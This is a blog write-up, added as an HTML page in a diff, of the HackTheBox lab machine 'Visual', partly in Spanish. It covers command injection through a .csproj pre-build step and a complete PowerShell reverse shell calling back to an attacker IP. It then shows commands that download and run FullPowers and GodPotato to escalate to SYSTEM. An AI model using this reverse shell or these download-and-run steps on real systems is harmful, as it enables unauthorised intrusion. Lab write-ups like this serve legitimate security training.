@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Visual 0840890c71974a4cb941dd43720bdafa | Pwn3d777</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Visual 0840890c71974a4cb941dd43720bdafa" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Visual" />
+<meta property="og:description" content="Visual" />
+<link rel="canonical" href="https://your-site-url/writeups/2025/07/10/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f.html" />
+<meta property="og:url" content="https://your-site-url/writeups/2025/07/10/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f.html" />
+<meta property="og:site_name" content="Pwn3d777" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-10T16:05:57+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Visual 0840890c71974a4cb941dd43720bdafa" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-10T16:05:57+00:00","datePublished":"2025-07-10T16:05:57+00:00","description":"Visual","headline":"Visual 0840890c71974a4cb941dd43720bdafa","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/10/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f.html"},"url":"https://your-site-url/writeups/2025/07/10/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Visual 0840890c71974a4cb941dd43720bdafa</h1>
+  
+  <div class="post-date">
+    Published on 10 Jul 2025
+    
+  </div>
+  
+  <h1 id="visual">Visual</h1>
+
+<p>HackTheBox: Medium</p>
+
+<aside>
+💡 Visual is a windows machine which handles with repositories and build visual studio projects
+
+</aside>
+
+<h2 id="1-enumeration">1: Enumeration</h2>
+
+<ul>
+  <li>nmap scanning</li>
+</ul>
+
+<p><img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled.png" alt="Untitled" /></p>
+
+<p>We find there’s a http service hosted in apache with php</p>
+
+<p><img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_1.png" alt="Untitled" /></p>
+
+<p>This service allows to make the build project in a automated way, we can see a section where we just put the url repo and wait for it.</p>
+
+<p>First at all we test functionality</p>
+
+<p>To get into the machine successfully we need some files:</p>
+
+<ol>
+  <li>A repository with c# code</li>
+  <li>A file .csproj and .sln</li>
+  <li>A rev shell to access to the machine once the code is injected</li>
+</ol>
+
+<blockquote>
+  <p>The machine doesn’t have access to internet therefore we need to run a private server where we could get the repo, we get this in this way</p>
+
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git <span class="nt">--bare</span> clone external_repo
+<span class="nb">cd </span>repo/.git
+git <span class="nt">--bare</span> update-server-info
+<span class="nb">mv </span>hooks/post-updte.sample hooks/post-update
+<span class="nb">cd</span> ..
+python <span class="nt">-m</span> http.server 8000
+</code></pre></div></div>
+
+<blockquote>
+  <p>.csproj = This file has the possibility of iinject commands through prebuild tag.</p>
+
+</blockquote>
+
+<p><img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_2.png" alt="Untitled" /></p>
+
+<h2 id="2-user-flag">2: User flag</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$socket</span> <span class="o">=</span> new-object System.Net.Sockets.TcpClient<span class="o">(</span><span class="s1">'10.10.14.14'</span>, 2222<span class="o">)</span><span class="p">;</span>
+<span class="k">if</span><span class="o">(</span><span class="nv">$socket</span> <span class="nt">-eq</span> <span class="nv">$null</span><span class="o">){</span><span class="nb">exit </span>1<span class="o">}</span>
+<span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$socket</span>.GetStream<span class="o">()</span><span class="p">;</span>
+<span class="nv">$writer</span> <span class="o">=</span> new-object System.IO.StreamWriter<span class="o">(</span><span class="nv">$stream</span><span class="o">)</span><span class="p">;</span>
+<span class="nv">$buffer</span> <span class="o">=</span> new-object System.Byte[] 1024<span class="p">;</span>
+<span class="nv">$encoding</span> <span class="o">=</span> new-object System.Text.AsciiEncoding<span class="p">;</span>
+<span class="k">do</span>
+<span class="o">{</span>
+	<span class="nv">$writer</span>.Flush<span class="o">()</span><span class="p">;</span>
+	<span class="nv">$read</span> <span class="o">=</span> <span class="nv">$null</span><span class="p">;</span>
+	<span class="nv">$res</span> <span class="o">=</span> <span class="s2">""</span>
+	<span class="k">while</span><span class="o">(</span><span class="nv">$stream</span>.DataAvailable <span class="nt">-or</span> <span class="nv">$read</span> <span class="nt">-eq</span> <span class="nv">$null</span><span class="o">)</span> <span class="o">{</span>
+		<span class="nv">$read</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$buffer</span>, 0, 1024<span class="o">)</span>
+	<span class="o">}</span>
+	<span class="nv">$out</span> <span class="o">=</span> <span class="nv">$encoding</span>.GetString<span class="o">(</span><span class="nv">$buffer</span>, 0, <span class="nv">$read</span><span class="o">)</span>.Replace<span class="o">(</span><span class="s2">"</span><span class="sb">`</span>r<span class="sb">`</span><span class="s2">n"</span>,<span class="s2">""</span><span class="o">)</span>.Replace<span class="o">(</span><span class="s2">"</span><span class="sb">`</span>n<span class="s2">","");
+	if(!</span><span class="nv">$out</span><span class="s2">.equals("</span><span class="nb">exit</span><span class="s2">")){
+		</span><span class="nv">$args</span><span class="s2"> = "";
+		if(</span><span class="nv">$out</span><span class="s2">.IndexOf(' ') -gt -1){
+			</span><span class="nv">$args</span><span class="s2"> = </span><span class="nv">$out</span><span class="s2">.substring(</span><span class="nv">$out</span><span class="s2">.IndexOf(' ')+1);
+			</span><span class="nv">$out</span><span class="s2"> = </span><span class="nv">$out</span><span class="s2">.substring(0,</span><span class="nv">$out</span><span class="s2">.IndexOf(' '));
+			if(</span><span class="nv">$args</span><span class="s2">.split(' ').length -gt 1){
+                </span><span class="nv">$pinfo</span><span class="s2"> = New-Object System.Diagnostics.ProcessStartInfo
+                </span><span class="nv">$pinfo</span><span class="s2">.FileName = "</span>cmd.exe<span class="s2">"
+                </span><span class="nv">$pinfo</span><span class="s2">.RedirectStandardError = </span><span class="nv">$true</span><span class="s2">
+                </span><span class="nv">$pinfo</span><span class="s2">.RedirectStandardOutput = </span><span class="nv">$true</span><span class="s2">
+                </span><span class="nv">$pinfo</span><span class="s2">.UseShellExecute = </span><span class="nv">$false</span><span class="s2">
+                </span><span class="nv">$pinfo</span><span class="s2">.Arguments = "</span>/c <span class="nv">$out</span> <span class="nv">$args</span><span class="s2">"
+                </span><span class="nv">$p</span><span class="s2"> = New-Object System.Diagnostics.Process
+                </span><span class="nv">$p</span><span class="s2">.StartInfo = </span><span class="nv">$pinfo</span><span class="s2">
+                </span><span class="nv">$p</span><span class="s2">.Start() | Out-Null
+                </span><span class="nv">$p</span><span class="s2">.WaitForExit()
+                </span><span class="nv">$stdout</span><span class="s2"> = </span><span class="nv">$p</span><span class="s2">.StandardOutput.ReadToEnd()
+                </span><span class="nv">$stderr</span><span class="s2"> = </span><span class="nv">$p</span><span class="s2">.StandardError.ReadToEnd()
+                if (</span><span class="nv">$p</span><span class="s2">.ExitCode -ne 0) {
+                    </span><span class="nv">$res</span><span class="s2"> = </span><span class="nv">$stderr</span><span class="s2">
+                } else {
+                    </span><span class="nv">$res</span><span class="s2"> = </span><span class="nv">$stdout</span><span class="s2">
+                }
+			}
+			else{
+				</span><span class="nv">$res</span><span class="s2"> = (&amp;"</span><span class="nv">$out</span><span class="s2">" "</span><span class="nv">$args</span><span class="s2">") | out-string;
+			}
+		}
+		else{
+			</span><span class="nv">$res</span><span class="s2"> = (&amp;"</span><span class="nv">$out</span><span class="s2">") | out-string;
+		}
+		if(</span><span class="nv">$res</span><span class="s2"> -ne </span><span class="nv">$null</span><span class="s2">){
+        </span><span class="nv">$writer</span><span class="s2">.WriteLine(</span><span class="nv">$res</span><span class="s2">)
+    }
+	}
+}While (!</span><span class="nv">$out</span><span class="s2">.equals("</span><span class="nb">exit</span><span class="s2">"))
+</span><span class="nv">$writer</span><span class="s2">.close();
+</span><span class="nv">$socket</span><span class="s2">.close();
+</span><span class="nv">$stream</span><span class="s2">.Dispose()
+</span></code></pre></div></div>
+
+<p>Con este rev shell ponemos en escucha en el puerto establecido y ya obtenemos acceso</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">c:\Users\enox\Desktop\user.txt</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="3-priv-esc">3: Priv esc</h2>
+
+<p>wrapper pred:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">C:\xampp\htdocs\uploads</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Revisamos privilegios</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Check some privileges and look “ImpersonatePrivilege” is not present</p>
+
+<p><img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_3.png" alt="Untitled" /></p>
+
+<p>We cannot modify or access to files but we can create them</p>
+
+<p>Use the server early running and add fullpowers, a POC that rest default privileges</p>
+
+<p>With impersonate privileges we can assume other identities, sometime interesting that happens to me in this machine is that i had to reset the machine to make work fullpowers properly</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nx">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://10.10.00.000:0000/fullpowers.exe</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">Fullpowers.exe</span><span class="w">
+</span><span class="n">fullpowers.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f_Untitled_4.png" alt="Untitled" /></p>
+
+<p>We got all priv is time to use godpotato and get the whole power</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nx">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://10.10.14.14:8000/GodPotato.exe</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">GodPotato.exe</span><span class="w">
+</span><span class="n">GodPotato-NET64</span><span class="w"> </span><span class="nt">-cmd</span><span class="w"> </span><span class="s2">"cmd /c type C:\Users\Administrator\Desktop\root.txt"</span><span class="w">
+</span></code></pre></div></div>
+
+<p>There was a problem, godpotato which will allow us to run commands as system had 3 exe’s and only the 64 one worked</p>
+
+<p>Machine pwned!!</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://your-site-url/writeups/2025/07/10/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f.html';
+     this.page.identifier = '/writeups/2025/07/10/053ed3ea-d2e7-46e5-a8b0-b01f7f457444-export-0290a086-8ce8-4e90-aaee-96808973454f';
+     this.page.title = 'Visual 0840890c71974a4cb941dd43720bdafa';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
+            Dog 207b952552918059ae99cbb25a8392ef
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
+            Titanic 1eab9525529180a9b52fc9a7eb126a50
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
+            Cat 1abb9525529180ae82d4f25f2121346a
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
